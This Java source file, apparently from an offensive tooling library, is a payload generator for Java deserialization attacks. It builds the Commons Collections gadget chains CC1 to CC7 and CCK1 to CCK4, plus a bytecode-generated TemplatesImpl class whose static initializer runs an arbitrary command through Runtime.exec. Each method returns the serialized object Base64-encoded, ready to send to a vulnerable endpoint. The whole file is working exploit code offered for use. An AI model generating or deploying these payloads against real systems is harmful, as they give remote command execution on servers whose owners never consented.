package org.hac.lib;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.hac.function.NativeFunction;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.*;

import static org.objectweb.asm.Opcodes.*;
import static org.objectweb.asm.Opcodes.RETURN;

@SuppressWarnings("all")
public class PayloadLib {
    private static final String LIB_NAME = "payload";
    public static List<NativeFunction> lib = new ArrayList<>();

    static {
        try {
            Method getCC1 = PayloadLib.class.getMethod("getCC1", String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "getCC1", getCC1));
            Method getCC2 = PayloadLib.class.getMethod("getCC2", String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "getCC2", getCC2));
            Method getCC3 = PayloadLib.class.getMethod("getCC3", String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "getCC3", getCC3));
            Method getCC4 = PayloadLib.class.getMethod("getCC4", String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "getCC4", getCC4));
            Method getCC5 = PayloadLib.class.getMethod("getCC5", String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "getCC5", getCC5));
            Method getCC6 = PayloadLib.class.getMethod("getCC6", String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "getCC6", getCC6));
            Method getCC7 = PayloadLib.class.getMethod("getCC7", String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "getCC7", getCC7));
            Method getCCK1 = PayloadLib.class.getMethod("getCCK1", String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "getCCK1", getCCK1));
            Method getCCK2 = PayloadLib.class.getMethod("getCCK2", String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "getCCK2", getCCK2));
            Method getCCK3 = PayloadLib.class.getMethod("getCCK3", String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "getCCK3", getCCK3));
            Method getCCK4 = PayloadLib.class.getMethod("getCCK4", String.class);
            lib.add(new NativeFunction(LIB_NAME + LibManager.SEP + "getCCK4", getCCK4));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] getTemplates(String cmd) {
        ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        MethodVisitor methodVisitor;
        classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, "sample/PrivateShellInject",
                null, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet",
                null);
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "()V",
                null, null);
        methodVisitor.visitCode();
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitMethodInsn(INVOKESPECIAL,
                "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet",
                "<init>", "()V", false);
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(1, 1);
        methodVisitor.visitEnd();

        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "transform",
                "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/" +
                        "internal/serializer/SerializationHandler;)V", null,
                new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
        methodVisitor.visitCode();
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(0, 3);
        methodVisitor.visitEnd();

        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "transform",
                "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/" +
                        "internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/" +
                        "internal/serializer/SerializationHandler;)V",
                null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
        methodVisitor.visitCode();
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(0, 4);
        methodVisitor.visitEnd();

        methodVisitor = classWriter.visitMethod(ACC_STATIC, "<clinit>",
                "()V", null, null);
        methodVisitor.visitCode();
        Label label0 = new Label();
        Label label1 = new Label();
        Label label2 = new Label();
        methodVisitor.visitTryCatchBlock(label0, label1, label2, "java/io/IOException");
        methodVisitor.visitLabel(label0);
        methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime",
                "getRuntime", "()Ljava/lang/Runtime;", false);
        methodVisitor.visitLdcInsn(cmd);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime",
                "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
        methodVisitor.visitInsn(POP);
        methodVisitor.visitLabel(label1);
        Label label3 = new Label();
        methodVisitor.visitJumpInsn(GOTO, label3);
        methodVisitor.visitLabel(label2);
        methodVisitor.visitVarInsn(ASTORE, 0);
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL,
                "java/io/IOException", "printStackTrace", "()V", false);
        methodVisitor.visitLabel(label3);
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(2, 1);
        methodVisitor.visitEnd();
        classWriter.visitEnd();
        return classWriter.toByteArray();
    }

    public static String getCC1(String cmd) {
        try {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class}, new Object[]{cmd})
            };
            Transformer chainedTransformer = new ChainedTransformer(transformers);
            Map uselessMap = new HashMap();
            Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);
            InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(handler1);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return Base64Lib.encode(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getCC2(String cmd) {
        try {
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{getTemplates(cmd)});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            Map uselessMap = new HashMap();
            Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),
                    LazyMap.class.getInterfaces(), handler);
            InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(handler1);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return Base64Lib.encode(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getCC3(String cmd) {
        try {
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{getTemplates(cmd)});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            org.apache.commons.collections4.functors.InvokerTransformer invokerTransformer = new
                    org.apache.commons.collections4.functors.
                            InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
            TransformingComparator comparator = new TransformingComparator(invokerTransformer);
            PriorityQueue priorityQueue = new PriorityQueue(2);
            priorityQueue.add(1);
            priorityQueue.add(1);
            Object[] objects = new Object[]{templates, templates};
            setFieldValue(priorityQueue, "queue", objects);
            setFieldValue(priorityQueue, "comparator", comparator);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(priorityQueue);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return Base64Lib.encode(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getCC4(String cmd) {
        try {
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{getTemplates(cmd)});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            org.apache.commons.collections4.Transformer[] transformers = new
                    org.apache.commons.collections4.Transformer[]{
                    new org.apache.commons.collections4.functors.ConstantTransformer(TrAXFilter.class),
                    new org.apache.commons.collections4.functors.InstantiateTransformer(
                            new Class[]{Templates.class}, new Object[]{templates})
            };
            org.apache.commons.collections4.functors.ChainedTransformer chainedTransformer = new
                    org.apache.commons.collections4.functors.ChainedTransformer(transformers);
            org.apache.commons.collections4.comparators.TransformingComparator comparator = new
                    org.apache.commons.collections4.comparators.TransformingComparator(chainedTransformer);
            PriorityQueue priorityQueue = new PriorityQueue(2);
            priorityQueue.add(1);
            priorityQueue.add(1);
            Object[] objects = new Object[]{templates, templates};
            setFieldValue(priorityQueue, "queue", objects);
            setFieldValue(priorityQueue, "comparator", comparator);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(priorityQueue);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return Base64Lib.encode(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getCC5(String cmd) {
        try {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class}, new Object[]{cmd})
            };
            Transformer chainedTransformer = new ChainedTransformer(transformers);
            Map uselessMap = new HashMap();
            Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test");
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            Field val = BadAttributeValueExpException.class.getDeclaredField("val");
            val.setAccessible(true);
            val.set(badAttributeValueExpException, tiedMapEntry);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return Base64Lib.encode(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getCC6(String cmd) {
        try {
            Transformer transformer = new ChainedTransformer(new Transformer[]{});
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[]{}}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[]{}}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
            };
            Map map = new HashMap();
            Map lazyMap = LazyMap.decorate(map, transformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test");
            HashSet hashSet = new HashSet(1);
            hashSet.add(tiedMapEntry);
            lazyMap.remove("test");
            Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
            field.setAccessible(true);
            field.set(transformer, transformers);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(hashSet);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return Base64Lib.encode(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getCC7(String cmd) {
        try {
            Transformer[] fakeTransformer = new Transformer[]{};
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class}, new Object[]{cmd})
            };
            Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);
            Map innerMap1 = new HashMap();
            Map innerMap2 = new HashMap();
            Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);
            lazyMap1.put("yy", 1);
            Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
            lazyMap2.put("zZ", 1);
            Hashtable hashtable = new Hashtable();
            hashtable.put(lazyMap1, "test");
            hashtable.put(lazyMap2, "test");
            Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
            field.setAccessible(true);
            field.set(chainedTransformer, transformers);
            lazyMap2.remove("yy");
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(hashtable);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return Base64Lib.encode(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getCCK1(String cmd) {
        try {
            Object tpl = getTemplates(cmd);
            InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
            HashMap<String, String> innerMap = new HashMap<String, String>();
            Map m = LazyMap.decorate(innerMap, transformer);
            Map outerMap = new HashMap();
            TiedMapEntry tied = new TiedMapEntry(m, tpl);
            outerMap.put(tied, "t");
            innerMap.clear();
            setFieldValue(transformer, "iMethodName", "newTransformer");
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(outerMap);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return Base64Lib.encode(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getCCK2(String cmd) {
        try {
            Object tpl = getTemplates(cmd);
            org.apache.commons.collections4.functors.InvokerTransformer transformer = new
                    org.apache.commons.collections4.functors.
                            InvokerTransformer("toString", new Class[0], new Object[0]);
            HashMap<String, String> innerMap = new HashMap<String, String>();
            Map m = org.apache.commons.collections4.map.LazyMap.lazyMap(innerMap, transformer);
            Map outerMap = new HashMap();
            TiedMapEntry tied = new TiedMapEntry(m, tpl);
            outerMap.put(tied, "t");
            innerMap.clear();
            setFieldValue(transformer, "iMethodName", "newTransformer");
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(outerMap);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return Base64Lib.encode(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getCCK3(String cmd) {
        try {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{
                            String.class, Class[].class}, new Object[]{
                            "getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{
                            Object.class, Object[].class}, new Object[]{
                            null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class}, new Object[]{cmd}),
                    new ConstantTransformer(new HashSet<String>())};
            ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});
            HashMap<String, String> innerMap = new HashMap<String, String>();
            Map m = LazyMap.decorate(innerMap, inertChain);
            Map outerMap = new HashMap();
            TiedMapEntry tied = new TiedMapEntry(m, "v");
            outerMap.put(tied, "t");
            innerMap.clear();
            setFieldValue(inertChain, "iTransformers", transformers);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(outerMap);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return Base64Lib.encode(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getCCK4(String cmd) {
        try {
            org.apache.commons.collections4.Transformer[] transformers =
                    new org.apache.commons.collections4.Transformer[]{
                            new org.apache.commons.collections4.functors.ConstantTransformer(Runtime.class),
                            new org.apache.commons.collections4.functors.InvokerTransformer(
                                    "getMethod", new Class[]{
                                    String.class, Class[].class}, new Object[]{
                                    "getRuntime", new Class[0]}),
                            new org.apache.commons.collections4.functors.InvokerTransformer(
                                    "invoke", new Class[]{
                                    Object.class, Object[].class}, new Object[]{
                                    null, new Object[0]}),
                            new org.apache.commons.collections4.functors.InvokerTransformer("exec",
                                    new Class[]{String.class}, new Object[]{cmd}),
                            new org.apache.commons.collections4.functors.ConstantTransformer(
                                    new HashSet<String>())};
            org.apache.commons.collections4.functors.ChainedTransformer inertChain = new
                    org.apache.commons.collections4.functors.ChainedTransformer(
                    new org.apache.commons.collections4.Transformer[]{});
            HashMap<String, String> innerMap = new HashMap<String, String>();
            Map m = org.apache.commons.collections4.map.LazyMap.lazyMap(innerMap, inertChain);
            Map outerMap = new HashMap();
            TiedMapEntry tied = new TiedMapEntry(m, "v");
            outerMap.put(tied, "t");
            innerMap.clear();
            setFieldValue(inertChain, "iTransformers", transformers);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(outerMap);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return Base64Lib.encode(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static Object getFieldValue(Object object, String fieldName) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            return field.get(object);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
